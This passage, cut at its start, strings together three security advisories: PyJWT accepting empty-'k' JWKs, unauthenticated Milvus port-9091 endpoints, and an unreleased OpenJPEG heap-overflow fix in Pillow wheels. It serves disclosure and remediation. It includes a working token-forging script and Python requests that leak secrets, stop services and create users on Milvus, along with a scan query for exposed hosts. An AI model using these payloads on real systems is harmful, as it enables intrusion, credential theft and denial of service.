same empty key. The attacker needs no secret knowledge: they reproduce the digest
locally with an empty key and set the token's `kid` to the empty-`k` JWK.

The empty-key rejection that `HMACAlgorithm.prepare_key` performs for
string/bytes secrets (added in 2.13.0) was never propagated to the sibling
`from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under
default decode options this path only emits an `InsecureKeyLengthWarning`, not an
error, so verification still succeeds. This is the same "empty/nil HMAC key is
accepted by verify" defect the JWT ecosystem is currently closing library-side:
fast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a
library-side reject-empty-HMAC-key precondition.

### Affected versions

`PyJWT` (PyPI package `pyjwt`) `<= 2.13.0`, current `master` at commit
`7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is
already guarded in 2.13.0; the JWK/JWKS path is not.

### Privilege required

Unauthenticated. Any party who can reach a JWT-verifying endpoint of an
application that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct
key has an empty `k` can forge tokens with arbitrary claims.

Preconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct
entry carries an empty `k`. This occurs when the signing secret is sourced from
an unset environment variable / unset config row / key-finder fallback that
base64url-encodes `b""` into the published JWKS, or when the application trusts a
JWKS containing such an entry. The equivalent unset-secret case for the
string-secret API (`jwt.decode(token, key="")`) is already rejected in 2.13.0;
the JWK route is the remaining reachable surface for the same misconfiguration.

### Vulnerable code

`jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):

```python
@staticmethod
def from_jwk(jwk: str | JWKDict) -> bytes:
    try:
        if isinstance(jwk, str):
            obj: JWKDict = json.loads(jwk)
        elif isinstance(jwk, dict):
            obj = jwk
        else:
            raise ValueError
    except ValueError:
        raise InvalidKeyError("Key is not valid JSON") from None

    if obj.get("kty") != "oct":
        raise InvalidKeyError("Not an HMAC key")

    return base64url_decode(obj["k"])   # <-- empty k -> b"", no rejection
```

Contrast the sibling `prepare_key`, which DID get the guard (lines 325-329):

```python
def prepare_key(self, key: str | bytes) -> bytes:
    key_bytes = force_bytes(key)

    if len(key_bytes) == 0:
        raise InvalidKeyError("HMAC key must not be empty.")
```

In `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key
material directly, bypassing `prepare_key`, and the length warning is non-fatal
by default:

```python
        if isinstance(key, PyJWK):
            if alg != key.algorithm_name:
                raise InvalidAlgorithmError(
                    f"Token algorithm {alg!r} does not match the key's "
                    f"algorithm {key.algorithm_name!r}"
                )
            alg_obj = key.Algorithm
            prepared_key = key.key            # from_jwk output (b""), prepare_key not run
        else:
            try:
                alg_obj = self.get_algorithm_by_name(alg)
            except NotImplementedError as e:
                raise InvalidAlgorithmError("Algorithm not supported") from e
            prepared_key = alg_obj.prepare_key(key)

        key_length_msg = alg_obj.check_key_length(prepared_key)
        if key_length_msg:
            if effective_options.get("enforce_minimum_key_length", False):
                raise InvalidKeyError(key_length_msg)
            else:
                warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only

        if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b"" succeeds
            raise InvalidSignatureError("Signature verification failed")
```

`PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a
`{"kty":"oct","k":""}` JWK yields `PyJWK.key == b""`. `PyJWKSet` and
`PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the
JWKS-over-HTTP resolution route is affected identically.

The 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM
hardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix
(GHSA-jq35-7prp-9v3f), and the test suite has
`test_hmac_prepare_key_rejects_empty_key` plus
`test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty
JSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the
untested sibling path this report closes.

### How the attacker input reaches the sink

An unauthenticated HTTP client controls the bearer token entirely: its `kid`
selects the empty-`k` oct JWK, and its signature is computed locally with the
empty key. The token flows request header -> `PyJWKClient.get_signing_key_from_jwt`
(kid resolution against the trusted JWKS) -> `jwt.decode` with the resolved
`PyJWK` -> `_verify_signature` -> `HMACAlgorithm.verify(signing_input, b"", sig)`.
No secret,
credential, or prior session is required; the only server-side precondition is a
JWKS oct entry with an empty `k`, which the "unset signing secret" configuration
produces. This is the identical trust boundary the string-secret path already
guards.

### Proof of concept

### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)

Two services model a standard OIDC-style deployment: an auth service publishing a
JWKS, and a protected resource server validating bearer tokens against that JWKS
with PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret
is sourced from an unset env var (`SIGNING_SECRET` unset -> `""`), so the
published oct JWK carries `k == ""`.

`idp.py` (auth service):

```python
import os, base64
from flask import Flask, jsonify
app = Flask(__name__)
SIGNING_SECRET = os.environ.get("SIGNING_SECRET", "")   # UNSET at runtime -> ""
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

@app.route("/.well-known/jwks.json")
def jwks():
    return jsonify({"keys": [{
        "kty": "oct", "use": "sig", "alg": "HS256",
        "kid": "auth-signing-2026",
        "k": b64u(SIGNING_SECRET.encode()),   # empty secret -> k == ""
    }]})

if __name__ == "__main__":
    app.run(port=9101)
```

`api.py` (protected resource server):

```python
from flask import Flask, request, jsonify
import jwt
from jwt import PyJWKClient
app = Flask(__name__)
jwks_client = PyJWKClient("http://127.0.0.1:9101/.well-known/jwks.json")

def authenticate():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return None, "missing bearer token"
    token = auth.split(" ", 1)[1]
    try:
        signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid
        claims = jwt.decode(token, signing_key, algorithms=["HS256", "RS256"])
    except Exception as e:
        return None, "invalid token: %s" % type(e).__name__
    return claims, None

@app.route("/api/admin/users")
def admin_users():
    claims, err = authenticate()
    if err:
        return jsonify({"error": err}), 401
    if claims.get("role") != "admin":
        return jsonify({"error": "forbidden"}), 403
    return jsonify({"ok": True, "action": "list_all_users",
                    "as_user": claims.get("sub"), "role": claims.get("role")})

if __name__ == "__main__":
    app.run(port=9102)
```

`forge.py` (attacker; no secret knowledge):

```python
import hmac, hashlib, base64, json, sys
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
header={"alg":"HS256","typ":"JWT","kid":"auth-signing-2026"}
payload={"sub":"attacker@evil.example","role":"admin"}
si=b64u(json.dumps(header,separators=(',',':')).encode())+"."+b64u(json.dumps(payload,separators=(',',':')).encode())
key = sys.argv[1].encode() if len(sys.argv)>1 else b""   # empty key
sig=hmac.new(key, si.encode(), hashlib.sha256).digest()
print(si+"."+b64u(sig))
```

Run:

```bash
python -m venv v && ./v/bin/pip install "PyJWT==2.13.0" flask
( SIGNING_SECRET= ./v/bin/python idp.py & ) ; ./v/bin/python api.py &
FORGED=$(./v/bin/python forge.py "")
curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:9102/api/admin/users
```

Verbatim run (attack, both negative controls, sanity, and patched-build re-run):

```
### PyJWT version
2.13.0

### JWKS published by the auth service (note the empty "k"):
{"keys":[{"alg":"HS256","k":"","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}

### Baseline: unauthenticated request to admin endpoint
HTTP 401

### ATTACK: attacker forges HS256 admin token signed with the EMPTY key
forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ
response:
{"action":"list_all_users","as_user":"attacker@evil.example","ok":true,"role":"admin"}
  <-- HTTP 200

### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -> reject
{"error":"invalid token: InvalidSignatureError"}
  <-- HTTP 401

### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail
JWKS now has non-empty k:
{"keys":[{"alg":"HS256","k":"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}
{"error":"invalid token: InvalidSignatureError"}
  <-- HTTP 401

### Sanity: a legitimately-signed token with the real secret is accepted
{"action":"list_all_users","as_user":"attacker@evil.example","ok":true,"role":"admin"}
  <-- HTTP 200

### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -> now rejected
JWKS (empty k, vulnerable config):
{"keys":[{"alg":"HS256","k":"","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}
{"error":"invalid token: PyJWKSetError"}
  <-- HTTP 401
```

The attack returns HTTP 200 with `role:admin` from an unauthenticated forged
token. Both negative controls (wrong non-empty key; real non-empty secret at the
auth service) return 401, isolating the defect to empty-key acceptance. The
patched build (the `from_jwk` fix below) rejects the forgery.

### Impact

- Unauthenticated authentication bypass / token forgery: an attacker mints tokens
  with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,
  yielding full impersonation and privilege escalation on any endpoint gated by
  such tokens.
- Reachable through the documented JWKS verification API
  (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.
- Triggered by the common "unset signing secret" misconfiguration that the
  string-secret path already rejects in 2.13.0, leaving the JWK path as an
  asymmetric gap.

### Suggested fix

Reject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that
`prepare_key` already applies:

```python
if obj.get("kty") != "oct":
    raise InvalidKeyError("Not an HMAC key")

key_bytes = base64url_decode(obj["k"])
if len(key_bytes) == 0:
    raise InvalidKeyError("HMAC key must not be empty.")
return key_bytes
```

This reuses the exact error message and length check the string/bytes path uses,
so both HMAC key-loading routes enforce the same invariant. A regression test for
the empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.

### Fix PR

https://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory
temp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,
DCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,
`test_api_jwk.py`, `test_api_jws.py` pass).

### Credit

Reported by tonghuaroot.

> Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

## Summary

Milvus exposes TCP port 9091 by default with two critical authentication bypass vulnerabilities:

1. The `/expr` debug endpoint uses a weak, predictable default authentication token derived from `etcd.rootPath` (default: `by-dev`), enabling arbitrary expression evaluation.
2. The full REST API (`/api/v1/*`) is registered on the metrics/management port without any authentication, allowing unauthenticated access to all business operations including data manipulation and credential management.

## Details

### Vulnerability 1: Weak Default Authentication on `/expr` Endpoint

The `/expr` endpoint on port 9091 accepts an `auth` parameter that defaults to the `etcd.rootPath` value (`by-dev`). This value is well-known and predictable. An attacker who can reach port 9091 can evaluate arbitrary internal Go expressions, leading to:

- **Information/Credential Disclosure**: Reading internal configuration values (MinIO secrets, etcd credentials) and user credential hashes via `param.MinioCfg.SecretAccessKey.GetValue()`, `rootcoord.meta.GetCredential(ctx, 'root')`, etc.
- **Denial of Service**: Invoking `proxy.Stop()` to shut down the proxy service.
- **Arbitrary File Write (potential RCE)**: Manipulating access log configuration parameters to write arbitrary content to arbitrary file paths on the server filesystem.

### Vulnerability 2: Unauthenticated REST API on Metrics Port

Business-logic HTTP handlers (collection management, data insertion, credential management) are registered on the metrics/management HTTP server at port 9091 via `registerHTTPServer()` in [`internal/distributed/proxy/service.go` (line 170)](https://github.com/milvus-io/milvus/blob/9996e8d1cebff7e7108bcb16d43124236de77438/internal/distributed/proxy/service.go#L170). These endpoints do not enforce any authentication, even when Milvus authentication is enabled on the primary gRPC/HTTP ports.

An attacker can perform any business operation without credentials, including:

- Creating, listing, and deleting collections
- Inserting and querying data
- Creating, listing, and deleting user credentials
- Modifying user passwords

## Proof of Concept

### PoC 1 — `/expr` Endpoint Exploitation

```python
import requests

url = "http://<target>:9091/expr"

# Leak sensitive configuration (e.g., MinIO secret key)
res = requests.get(url, params={
    "auth": "by-dev",
    "code": "param.MinioCfg.SecretAccessKey.GetValue()"
}, timeout=5)
print(res.json().get("output", ""))

# Retrieve hashed credentials for the root user
res = requests.get(url, params={
    "auth": "by-dev",
    "code": "rootcoord.meta.GetCredential(ctx, 'root')"
}, timeout=5)
print(res.json().get("output", ""))

# Denial of Service — stop the proxy
res = requests.get(url, params={
    "auth": "by-dev",
    "code": "proxy.Stop()"
}, timeout=5)

# Arbitrary file write (potential RCE)
for cmd in [
    'param.Save("proxy.accessLog.localPath", "/tmp")',
    'param.Save("proxy.accessLog.formatters.base.format", "whoami")',
    'param.Save("proxy.accessLog.filename", "evil.sh")',
    'querycoord.etcdCli.KV.Put(ctx, "by-dev/config/proxy/accessLog/enable", "true")'
]:
    requests.get(url, params={"auth": "by-dev", "code": cmd}, timeout=5)
```

### PoC 2 — Unauthenticated REST API Access

```python
import requests

target_url = "http://<target>:9091"

# Create a user without any authentication
res = requests.post(f"{target_url}/api/v1/credential", json={
    "username": "attacker_user",
    "password": "MTIzNDU2Nzg5",
})
print(res.json())

# List all users
res = requests.get(f"{target_url}/api/v1/credential/users")
print(res.json())  # {'status': {}, 'usernames': ['root', 'attacker_user']}

# Create and delete collections, insert data — all without authentication
```

## Internet Exposure

A significant number of publicly exposed Milvus instances are discoverable via internet-wide scanning using the pattern:

```
http.body="404 page not found" && port="9091"
```

This indicates the vulnerability is actively exploitable in real-world production environments.

## Impact

An unauthenticated remote attacker with network access to port 9091 can:

1. **Exfiltrate secrets and credentials** — MinIO keys, etcd credentials, user password hashes, and all internal configuration values.
2. **Manipulate all data** — Create, modify, and delete collections, insert or remove data, bypassing all application-level access controls.
3. **Manage user accounts** — Create administrative users, reset passwords, and escalate privileges.
4. **Cause denial of service** — Shut down proxy services, drop databases, or corrupt metadata.
5. **Write arbitrary files** — Potentially achieve remote code execution by writing malicious files to the filesystem via access log configuration manipulation.

## Remediation

### Recommended Fixes

1. **Remove or disable the `/expr` endpoint** in production builds. If retained for debugging, it must require strong, non-default authentication and be disabled by default.
2. **Do not register business API routes on the metrics port.** Separate the metrics/health endpoints from the application REST API to ensure authentication middleware applies consistently.
3. **Bind port 9091 to localhost by default** (`127.0.0.1:9091`) so it is not externally accessible unless explicitly configured.
4. **Enforce authentication on all API endpoints**, regardless of which port they are served on.

### User Mitigations (until patched)

- Block external access to port 9091 using firewall rules or network policies.
- If running in Docker/Kubernetes, do not expose port 9091 outside the internal network.
- Change the `etcd.rootPath` from the default value `by-dev` to a strong, random value (partial mitigation only — does not address the unauthenticated REST API).

## Credit

This vulnerability was discovered and responsibly reported by **YingLin Xie** (xieyinglin@hust.edu.cn). It was independently reported by [0x1f](https://github.com/0x1f) and zznQ ([ac0d3r](https://github.com/ac0d3r)).

### Summary

Every Pillow wheel from 11.1.0 onward bundles a libopenjp2 containing a heap-buffer-overflow **write** that is fixed upstream on master but has never appeared in an OpenJPEG release. See https://osv.dev/vulnerability/OSV-2025-219

Because the wheel bundles its own copy, a patched host OS does not help. It is reachable from `Image.open(fp); im.load()` with default settings.

I am reporting it here rather than only upstream because Pillow is where the vulnerable binary actually reaches users.

Note the inversion that makes this easy to miss: **OpenJPEG 2.5.2 and earlier are safe.** The bug was introduced in `954c6e3c` (2024-06-25), so keeping the dependency current is what creates the exposure.

### Details

## Affected wheels

From `.github/dependencies.json` (`openjpeg`) at each tag:

| Pillow | bundled OpenJPEG | status |
|---|---|---|
| 10.4.0 | 2.5.2 | safe |
| 11.0.0 | 2.5.2 | safe |
| **11.1.0, 11.2.1, 11.3.0** | **2.5.3** | **affected** |
| **12.0.0 … 12.3.0** | **2.5.4** | **affected** |

Confirmed on an installed wheel: `PIL.features.version_codec('jpg_2000')` → `2.5.4`, bundled file `pillow.libs/libopenjp2-*.so.2.5.4`. `main` still pins `2.5.4` as of 2026-10-06.

## The defect

`src/lib/openjp2/j2k.c`, in `opj_j2k_read_sod`:

```c
OPJ_UINT32 l_current_tile_part =
    l_cstr_index->tile_index[p_j2k->m_current_tile_number].current_tpsno;
l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_header = l_current_pos;
l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_pos   =
    l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2;
```

`tp_index` is neither null-checked nor bounds-checked, and `l_current_tile_part` comes directly from the one-byte `TPsot` field of the SOT marker.

The correct guard already exists a few lines later in `opj_j2k_add_tlmarker` (j2k.c:8459), writing the **same array at the same index** behind `if (tp_index && l_current_tile_part < nb_tps)`. One writer checked, its sibling not.

Reached by giving the codestream a *valid* TLM marker — so `tp_index` is allocated once by `opj_j2k_build_tp_index_from_tlm`, sized to the TLM entry count, and `opj_j2k_read_sot` then skips all resizing — while setting `TNsot = 0` in every SOT, which keeps the TLM "valid" and lets `TPsot` walk past the allocation.

## Patch status

Fixed upstream in `91d08b11` ("Fix heap buffer overlfow in opj_j2k_read_sod", 2026-02-10).

The newest OpenJPEG tag is **v2.5.4 (2025-09-20)**, and `compare/v2.5.4...91d08b11` reports *ahead 6, behind 0* — the fix is **in no release, 8 months on**.

## Suggested remediation

1. Carry `91d08b11` as a patch in the wheel build until an OpenJPEG release includes it — three lines, identical to a guard already present in the same file.
2. Consider asking OpenJPEG to cut a release; they have had an unreleased memory-corruption fix on master since February 2026, and every distro is shipping the vulnerable code.
3. Your security handbook already tells applications to block EPS at the application layer. A similarly explicit note that `Image.open()` ignores filename/Content-Type and will reach any compiled-in codec unless `formats=` is passed would help downstream apps a lot.

## Not a Pillow bug, but relevant: the extension allowlist most apps rely on does not apply

`Image.open()` sniffs magic bytes, so a JPEG 2000 codestream in a file named `avatar.png` declared `Content-Type: image/png` reaches the JP2 decoder anyway.

I verified this against a production service documenting PNG/JPEG-only uploads: it accepted and fully decoded a JP2 through exactly that path, with 16 formats reachable from one upload endpoint against 43 registered openers. That service has since fixed it by passing `formats=` and validating on the detected format rather than the client's `Content-Type`.

That is the reason a decoder-level issue like this one has much wider reach than downstream maintainers tend to assume.

### Proof of concept

ASan build of OpenJPEG 2.5.4 interposed under a **stock Pillow 12.3.0**, running `Image.open(p); im.load()`:

```
==766332==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8
    #0 opj_j2k_read_sod          j2k.c:5086
    #1 opj_j2k_read_tile_header  j2k.c:9912
    #2 opj_read_tile_header      openjpeg.c:575
    #3 j2k_decode_entry          src/libImaging/Jpeg2KDecode.c:793
    #4 ImagingJpeg2KDecode       src/libImaging/Jpeg2KDecode.c:949
    #5 _decode                   src/decode.c:132
located 8 bytes to the right of a 24-byte region allocated by
    opj_j2k_build_tp_index_from_tlm j2k.c:8939
```

Frames 3–5 are Pillow's own decoder, not a synthetic harness. No non-default decoder options are involved; strict mode is on, which is Pillow's behaviour since Pillow never calls `opj_decoder_set_strict_mode`. A benign twin image runs the same path cleanly and returns a valid image, so this is the payload and not a parse failure.

I have deliberately **not** attached the PoC file to this initial report. I'm happy to attach the PoC, the builder script and the RIP-control harness here on request, or hold everything until a fix is ready.

No disclosure deadline from me; I will not publish anything while this is being worked on.

### Impact

Any application that calls `Image.open()` / `im.load()` on an image it did not produce — the overwhelmingly common case for upload handlers, thumbnailers and preview pipelines — can be made to perform an out-of-bounds heap write by supplying one crafted file.

**Floor, already certain.** On a stock non-sanitised wheel the overflow performs 245 writes walking to +5856 bytes past a 24-byte allocation, and glibc's own heap-metadata checker aborts the process (`corrupted size vs. prev_size`, `corrupted double-linked list`, SIGABRT). One file reliably kills a long-lived worker.

**Ceiling, demonstrated as a primitive but not as a finished exploit.** With same-size-class objects alive on both sides — an ordinary busy heap — the walk crosses `opj_event_mgr_t`, which holds three `opj_msg_callback` function pointers, and `opj_event_msg` then calls one (event.c:136):

```
rip  0x4000    <- value chosen by the attacker's file layout
rsi  0x3ff2    <- m_error_data, written by the same walk
```

Shifting the codestream with a COM marker moves `rip` with it (`0x16ce` → `0x4000`), so the instruction pointer is attacker-**chosen** rather than incidentally invalid. A benign control image leaves the same groomed heap untouched.

To be explicit about what I did not do: I have **not** built a working exploit. That additionally needs remote heap grooming and an ASLR defeat, and I attempted neither. I am reporting a controlled control-flow primitive, not a finished chain. The CVSS AC:H reflects that.
